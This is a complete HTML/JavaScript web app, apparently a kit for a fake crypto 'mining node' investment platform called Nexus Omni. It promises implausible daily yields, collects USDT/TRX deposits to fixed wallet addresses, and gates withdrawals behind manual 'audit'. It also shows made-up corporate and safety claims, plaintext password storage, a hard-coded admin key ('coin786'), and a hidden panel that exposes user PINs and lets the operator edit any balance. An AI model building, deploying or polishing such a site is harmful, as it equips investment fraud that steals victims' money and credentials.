<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Global Wealth Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-dark: #0f172a; }
        body { background: #f8fafc; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        /* Modern Node Styling */
        .node-card { background: #fff; border-radius: 32px; overflow: hidden; display: flex; align-items: center; height: 140px; box-shadow: 0 20px 40px -15px rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.02); margin-bottom: 18px; transition: 0.3s; }
        .node-img { width: 130px; height: 140px; object-fit: cover; border-right: 1px solid #f1f5f9; }
        .node-info { padding: 0 20px; flex: 1; }
        
        /* UI Elements */
        .glass-card { background: #ffffff; border-radius: 35px; box-shadow: 0 30px 60px -15px rgba(0,0,0,0.08); border: 1px solid rgba(255,255,255,0.8); }
        .btn-prime { background: var(--nexus-dark); color: #fff; border-radius: 24px; font-weight: 800; padding: 20px; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; transition: 0.3s; }
        .btn-prime:active { transform: scale(0.96); }
        .input-prime { background: #f1f5f9; border-radius: 22px; padding: 18px; width: 100%; border: 2.5px solid transparent; outline: none; font-weight: 700; transition: 0.3s; font-size: 14px; }
        .input-prime:focus { border-color: var(--nexus-blue); background: #fff; box-shadow: 0 10px 20px -10px rgba(37,99,235,0.2); }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; flex: 1; transition: 0.3s; }
        .nav-link.active { color: var(--nexus-blue); transform: translateY(-4px); }
        .pulse-active { width: 8px; height: 8px; background: #10b981; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; margin-right: 6px; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
        
        .legal-modal { display: none; position: fixed; inset: 0; background: white; z-index: 20000; overflow-y: auto; padding: 35px; animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 50000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-6 text-[10px] font-black uppercase tracking-[6px] text-slate-400">Initializing Core...</p>
    </div>

    <div id="main-view" class="pb-44">
        <header class="p-6 sticky top-0 z-50 bg-white/80 backdrop-blur-3xl border-b border-slate-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-slate-900 text-white rounded-[24px] flex items-center justify-center text-2xl font-black shadow-xl">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black text-slate-900 uppercase tracking-tight">---</p>
                    <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Global Sovereign Account</p>
                </div>
            </div>
            <button onclick="logout()" class="w-12 h-12 rounded-2xl bg-slate-50 text-slate-400 flex items-center justify-center text-lg"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="glass-card p-10 relative overflow-hidden bg-gradient-to-br from-slate-900 to-slate-800 text-white shadow-2xl">
                <div class="relative z-10">
                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-[4px] mb-2">Portfolio Valuation</p>
                    <h2 id="ui-bal" class="text-5xl font-black tracking-tighter">$0.00</h2>
                    <div class="mt-12 flex justify-between items-end border-t border-white/10 pt-8">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">Mining Yield</p>
                            <p id="ui-prof" class="text-3xl font-black text-emerald-400 tracking-tight">+$0.00</p>
                        </div>
                        <div class="flex gap-2">
                            <a href="https://t.me/yourtelegram" target="_blank" class="w-12 h-12 bg-white/10 rounded-2xl flex items-center justify-center text-xl"><i class="fa-brands fa-telegram"></i></a>
                            <button onclick="nav('bank')" class="bg-blue-600 px-6 h-12 rounded-2xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-blue-500/30">Transfer</button>
                        </div>
                    </div>
                </div>
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-blue-500 rounded-full blur-[100px] opacity-20"></div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="showLegal('about')" class="bg-white p-5 rounded-3xl text-[10px] font-black uppercase text-slate-500 shadow-sm border border-slate-50">Corporate Info</button>
                <button onclick="showLegal('faq')" class="bg-white p-5 rounded-3xl text-[10px] font-black uppercase text-slate-500 shadow-sm border border-slate-50">Support Hub</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Hardware Nodes</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-blue-600">Capital Injection</h3>
                <select id="d-asset" class="input-prime font-black" onchange="updAddr()">
                    <option value="">Asset Protocol</option>
                    <option value="TRX">TRX (TRC20)</option>
                    <option value="USDT">USDT (TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-6 border-t pt-8">
                    <p id="addr-txt" class="text-[11px] font-mono font-black text-blue-600 text-center p-5 bg-slate-50 rounded-2xl break-all"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Transaction Hash" class="input-prime">
                    <input type="file" id="d-img" class="text-[10px] font-bold text-slate-400">
                    <button onclick="sendD()" class="btn-prime">Submit Audit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Institutional Payout</h3>
                <select id="w-method" class="input-prime font-black">
                    <option value="">Select Gateway</option>
                    <option value="Binance">Binance Pro</option>
                    <option value="OKX">OKX Institutional</option>
                    <option value="ByBit">ByBit Terminal</option>
                    <option value="TrustWallet">Trust Wallet</option>
                    <option value="MetaMask">MetaMask (Web3)</option>
                    <option value="Coinbase">Coinbase Exchange</option>
                    <option value="Swift">Global Swift Wire</option>
                </select>
                <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-prime">
                <input type="text" id="w-name" placeholder="Legal Full Name" class="input-prime">
                <input type="text" id="w-acc" placeholder="Wallet / Account Identifier" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-blue-600">Finalize Withdrawal</button>
            </div>
            
            <div class="glass-card p-8 space-y-6">
                <input type="text" id="promo-val" placeholder="Voucher Code" class="input-prime">
                <button onclick="applyPromo()" class="btn-prime !bg-emerald-600">Apply Reward</button>
            </div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-sm font-black uppercase border-l-[6px] border-blue-600 pl-4 mb-8">Hardware Catalog</h3>
            <div id="elite-box" class="space-y-5 mb-12"></div>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-ledger" class="p-6 hidden">
            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400 mb-8">Financial History</h3>
            <div id="ledger-box" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-10 left-8 right-8 h-24 glass-card shadow-2xl flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-house-chimney text-2xl mb-1"></i>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-server text-2xl mb-1"></i>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-receipt text-2xl mb-1"></i>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-chart-line text-2xl mb-1"></i>LEDGER</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b">
            <h2 class="text-2xl font-black italic uppercase text-blue-600 tracking-tighter">Master Terminal</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-5xl font-light">&times;</button>
        </div>
        
        <div class="grid grid-cols-2 gap-4 mb-10">
            <button onclick="toggleMaint()" class="bg-amber-50 text-amber-600 p-6 rounded-3xl font-black text-[10px] uppercase">Maintenance Mode</button>
            <button onclick="addPromo()" class="bg-blue-50 text-blue-600 p-6 rounded-3xl font-black text-[10px] uppercase">New Promo Code</button>
        </div>

        <div id="adm-users-list" class="space-y-4 mb-10"></div>
        <div id="adm-req-list" class="space-y-6"></div>
    </div>

    <div id="legal-modal" class="legal-modal">
        <button onclick="closeLegal()" class="text-4xl float-right">&times;</button>
        <h2 id="legal-h" class="text-3xl font-black uppercase mt-12 mb-8">---</h2>
        <div id="legal-body" class="text-sm text-slate-500 space-y-6 leading-loose"></div>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-10 bg-slate-50">
        <div class="max-w-md w-full space-y-12">
            <div class="text-center">
                <h1 class="text-6xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[10px] font-black text-slate-400 uppercase tracking-[10px] mt-4">Future Yield Systems</p>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify & Enter</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase">New Capitalist? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register</span></p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Choose Identifier" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Initialize Vault</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase">Registered? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login</span></p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeData = {
            elite: [
                { id: 'e1', name: "Omni Sovereign X", price: 5000, daily: 750, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 'e2', name: "Titan Core Ultra", price: 15000, daily: 2500, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" }
            ],
            retail: Array.from({length: 8}, (_, i) => ({
                id: `r${i}`, name: `Protocol Node v${i+1}`, price: 100 + (i*250), daily: 15 + (i*22), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        // --- AUTH ---
        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Verification Failed.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, banned: false }); toggleAuth(false); }
        };

        // --- CORE SESSION ---
        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                if(d.banned) { logout(); alert("Session Terminated."); return; }
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-8 flex justify-between items-center border-l-8 border-blue-600">
                        <div><p class="text-[11px] font-black uppercase text-slate-800">${v.name}</p><p class="text-[9px] font-bold text-slate-400 mt-1 uppercase tracking-widest"><span class="pulse-active"></span>Protocol Online</p></div>
                        <span class="text-[10px] font-black bg-blue-50 text-blue-600 px-5 py-2 rounded-2xl">MINING</span>
                    </div>`).join('') || '<p class="text-center py-12 text-slate-300 font-black uppercase text-[10px] tracking-[4px]">No Active Protocols</p>';
                
                const hist = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('ledger-box').innerHTML = hist.map(([k, h]) => `
                    <div class="bg-white p-6 rounded-[28px] flex justify-between items-center shadow-sm">
                        <div><p class="text-[10px] font-black uppercase">${h.type}</p><p class="text-[8px] font-bold text-slate-400 mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><p class="text-[8px] font-black uppercase ${h.status === 'Cleared' ? 'text-emerald-500' : 'text-amber-500'}">${h.status}</p></div>
                    </div>`).join('');
            });
        }

        // --- WITHDRAWAL & DEPOSIT ---
        window.sendW = async () => {
            const uid = localStorage.getItem('nx_usr'), amt = parseFloat(document.getElementById('w-amt').value), method = document.getElementById('w-method').value, acc = document.getElementById('w-acc').value;
            if(!amt || !method || !acc) return alert("Fill all security fields.");
            const s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < amt) return alert("Insufficient Liquidity.");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - amt });
            const key = push(ref(db, 'admin/requests')).key;
            const req = { id: key, user: uid, amount: amt, method, accDetails: acc, status: 'Pending', type: 'Withdrawal', date: new Date().toLocaleString() };
            await set(ref(db, `admin/requests/${key}`), req);
            await set(ref(db, `users/${uid}/history/${key}`), req);
            alert("Withdrawal Audit Initiated. 🚀");
            nav('ledger');
        };

        // --- ADMIN GOD MODE ---
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Access Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('adm-users-list').innerHTML = u ? Object.entries(u).map(([id, d]) => `
                    <div class="bg-slate-50 p-6 rounded-3xl space-y-4">
                        <div class="flex justify-between items-center">
                            <div><p class="font-black text-xs uppercase text-slate-900">${id}</p><p class="text-[9px] font-bold text-blue-600 uppercase">PIN: ${d.password}</p></div>
                            <span class="text-[9px] font-black ${d.banned ? 'text-rose-600' : 'text-emerald-600'}">${d.banned ? 'BANNED' : 'ACTIVE'}</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}', 'add')" class="bg-emerald-600 text-white text-[8px] font-black px-4 py-2.5 rounded-xl">ADD $</button>
                            <button onclick="modBal('${id}', 'rem')" class="bg-rose-600 text-white text-[8px] font-black px-4 py-2.5 rounded-xl">DEDUCT $</button>
                            <button onclick="toggleBan('${id}', ${d.banned || false})" class="bg-black text-white text-[8px] font-black px-4 py-2.5 rounded-xl">BAN/UNBAN</button>
                        </div>
                    </div>`).join('') : '';
            });

            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('adm-req-list').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-6 border space-y-4">
                        <div class="flex justify-between font-black uppercase text-[10px]"><span>${r.type} | ${r.user}</span><span>$${r.amount}</span></div>
                        <p class="text-[9px] font-bold text-slate-500">Method: ${r.method || 'Deposit'}<br>Target: ${r.accDetails || 'N/A'}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-44 object-cover rounded-2xl border">` : ''}
                        <div class="flex gap-3">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared','${r.type}')" class="bg-emerald-600 text-white py-4 rounded-2xl flex-1 font-black text-[9px]">APPROVE</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined','${r.type}')" class="bg-rose-600 text-white py-4 rounded-2xl flex-1 font-black text-[9px]">REJECT</button>
                        </div>
                    </div>`).join('') : '<p class="text-center font-black text-slate-300 uppercase text-[9px] py-10">Queue Empty</p>';
            });
        }

        window.audit = async (id, user, amt, status, type) => {
            if(status === 'Cleared' && type === 'Deposit') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            if(status === 'Declined' && type === 'Withdrawal') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.modBal = async (uid, type) => {
            const val = prompt("Enter Amount:"); if(!val) return;
            const s = await get(ref(db, `users/${uid}`));
            const cur = s.val().balance || 0;
            await update(ref(db, `users/${uid}`), { balance: type === 'add' ? cur + parseFloat(val) : cur - parseFloat(val) });
            alert("Capital Adjusted.");
        };

        window.toggleBan = async (uid, cur) => await update(ref(db, `users/${uid}`), { banned: !cur });

        // --- HELPERS ---
        function renderNodes() {
            const ui = (n) => `
                <div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div class="node-info">
                        <h4 class="text-[11px] font-black uppercase text-slate-800">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600 mt-1">Yield: $${n.daily}/day</p>
                        <div class="flex justify-between items-center mt-4">
                            <span class="text-xl font-black text-slate-900">$${n.price}</span>
                            <button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-5 py-2.5 rounded-2xl shadow-lg shadow-blue-500/20">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        }

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr');
            const s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Insufficient Capital.");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/nodes`), { name, deployedAt: Date.now() });
            alert("Deployment Successful!"); nav('home');
        };

        const legals = {
            about: "<b>Global Headquarters:</b> 702 Main Street, Woodland, California, USA.<br><br>Nexus Omni is an institutional-grade node infrastructure provider. We specialize in automated hash-power distribution and liquidity farming protocols across North American data centers.",
            faq: "<b>1. How are yields calculated?</b> Yields are based on real-time node performance and network difficulty.<br><br><b>2. Withdrawal speed?</b> Our financial audit team typically clears requests within 1-6 hours.<br><br><b>3. Safety?</b> All user capital is held in cold-storage multi-signature wallets.",
            privacy: "Nexus Omni follows the California Consumer Privacy Act (CCPA). All personal data and transaction logs are encrypted with AES-256 standards and are never shared with 3rd-party advertisers.",
            terms: "Investors must acknowledge that digital asset mining involves hardware risk. Nexus Omni provides 99.9% uptime guarantee but is not responsible for global network protocol changes."
        };

        window.showLegal = (t) => { document.getElementById('legal-h').innerText = t.toUpperCase(); document.getElementById('legal-body').innerHTML = legals[t]; document.getElementById('legal-modal').style.display = 'block'; };
        window.closeLegal = () => document.getElementById('legal-modal').style.display = 'none';
        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value; const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.sendD = () => { const f = document.getElementById('d-img').files[0]; if(!f) return alert("Audit proof required."); const reader = new FileReader(); reader.readAsDataURL(f); reader.onload = async () => { const uid = localStorage.getItem('nx_usr'), key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: document.getElementById('d-amt').value, tid: document.getElementById('d-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Audit Initiated."); nav('ledger'); }; };
    </script>
</body>
</html>
